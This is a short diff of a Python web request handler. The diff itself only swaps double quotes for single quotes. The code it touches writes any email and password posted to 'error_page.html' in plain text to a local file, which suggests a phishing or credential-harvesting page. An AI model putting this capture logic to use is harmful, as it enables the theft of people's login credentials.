@@ -16,8 +16,8 @@ def handle_request(request_line_header: RequestLineHeader,
     :param args: Optional arguments coming from request.
     """
     methods = {
-        "GET": _handle_get_request,
-        "POST": _handle_post_request
+        'GET': _handle_get_request,
+        'POST': _handle_post_request
     }
     try:
         method = methods[request_line_header.method]
@@ -50,9 +50,9 @@ def _handle_post_request(request_line_header: RequestLineHeader,
     :param args: Optional additional arguments passed in request.
     """
 
-    if request_line_header.path.split('/')[-1] == "error_page.html":
-        args = args[0].split("=")
-        with open("source_files/file.txt", "a") as f:
+    if request_line_header.path.split('/')[-1] == 'error_page.html':
+        args = args[0].split('=')
+        with open('source_files/file.txt', 'a') as f:
             f.write(f'\nEmail: {args[1].replace("%40", "@")[:-4]}'
                     f' | Password: {args[2]}')
         send_file_response(path=request_line_header.path,
